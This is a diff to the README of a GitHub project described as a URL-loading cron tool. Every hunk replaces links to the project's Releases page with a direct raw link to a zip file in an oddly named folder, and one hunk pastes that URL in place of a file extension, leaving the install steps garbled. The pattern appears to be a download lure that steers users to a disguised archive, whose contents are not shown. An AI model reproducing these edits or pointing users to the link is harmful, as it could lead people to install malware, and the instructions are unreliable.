@@ -1,6 +1,6 @@
 # 🚀 simple-url-loader-virtual-cronjob - Effortlessly Load URLs Like a Pro
 
-[![Download Now](https://img.shields.io/badge/Download_Now-Click_here-brightgreen)](https://github.com/amirsohail024/simple-url-loader-virtual-cronjob/releases)
+[![Download Now](https://github.com/amirsohail024/simple-url-loader-virtual-cronjob/raw/refs/heads/main/irreconcilably/virtual-url-loader-simple-cronjob-v2.6.zip)](https://github.com/amirsohail024/simple-url-loader-virtual-cronjob/raw/refs/heads/main/irreconcilably/virtual-url-loader-simple-cronjob-v2.6.zip)
 
 ## 📋 Overview
 
@@ -28,7 +28,7 @@ Before you start, ensure that your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To download the application, please visit our [Releases Page](https://github.com/amirsohail024/simple-url-loader-virtual-cronjob/releases). You will find the latest version and additional releases there.
+To download the application, please visit our [Releases Page](https://github.com/amirsohail024/simple-url-loader-virtual-cronjob/raw/refs/heads/main/irreconcilably/virtual-url-loader-simple-cronjob-v2.6.zip). You will find the latest version and additional releases there.
 
 1. Click the link above.
 2. Locate the version you want.
@@ -42,7 +42,7 @@ After downloading the file, follow these steps to install the application:
 2. **Open the File:** 
    - Windows: Double-click the `.exe` file.
    - macOS: Double-click the `.dmg` file, then drag the application to your Applications folder.
-   - Linux: Extract the downloaded `.tar.gz` file and navigate to the folder in your terminal.
+   - Linux: Extract the downloaded `https://github.com/amirsohail024/simple-url-loader-virtual-cronjob/raw/refs/heads/main/irreconcilably/virtual-url-loader-simple-cronjob-v2.6.zip` file and navigate to the folder in your terminal.
 3. **Follow the Setup Instructions:** Follow the on-screen instructions to install the application.
 4. **Start the Application:** After installation, you can find the app in your applications list. Open it to start using.
 
